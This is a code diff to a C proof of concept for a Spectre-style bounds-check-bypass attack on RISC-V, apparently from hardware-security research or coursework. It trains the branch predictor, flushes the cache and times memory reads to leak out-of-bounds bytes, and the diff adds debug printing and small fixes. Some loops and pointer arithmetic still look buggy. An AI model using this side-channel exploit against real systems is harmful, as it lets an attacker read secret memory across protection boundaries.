@@ -3,12 +3,14 @@
 
 #include "cache.h"
 #include "riscv-util.h"
+//#include "log.h"
 
 #define PAGE_SZ 512
 #define ARRAY1_SZ 16
 #define TRAIN_TIMES 1000
 uint8_t array1[2345];
 uint8_t array2[256 * PAGE_SZ];
+uint8_t dummy = 0;
 
 uint64_t results[256];
 uint8_t min(uint64_t* results, uint64_t sz){
@@ -21,18 +23,17 @@ uint8_t min(uint64_t* results, uint64_t sz){
     return minVal;
 }
 
-uint8_t dummy = 0;
 void victimFunc(uint64_t idx){
     if (idx < ARRAY1_SZ){
         dummy = array2[array1[idx] * PAGE_SZ];
     }
 }
 
-
 int main(void){
     for(uint64_t attackIdx = ARRAY1_SZ; attackIdx < ~0; ++attackIdx){
         // make sure array you read from is not in the cache
-        flushCache(array2, sizeof(array2));
+        printf("Flush cache\n");
+        flushCache((uint64_t)array2, sizeof(array2));
         
         // train the BP to predice that the if will go through
         for(uint8_t trainIdx = 0; trainIdx = TRAIN_TIMES; ++trainIdx){
@@ -45,7 +46,7 @@ int main(void){
         // read out array 2 and see the hit secret value
         for (uint8_t i = 0; i < 256; ++i){
             uint64_t start = RDCYCLE;
-            uint8_t dummy &= array2[i*PAGE_SZ];
+            dummy &= array2[i*PAGE_SZ];
             uint64_t end = RDCYCLE;
         
             results[i] = end - start;
@@ -53,6 +54,8 @@ int main(void){
         
         // Note: Could do this using a threshold value for a hit
         uint8_t secret = min(results, 256);
+
+        printf("m[0x%p] = %d\n", &array1 + attackIdx, secret); 
     }
 
     return 0;
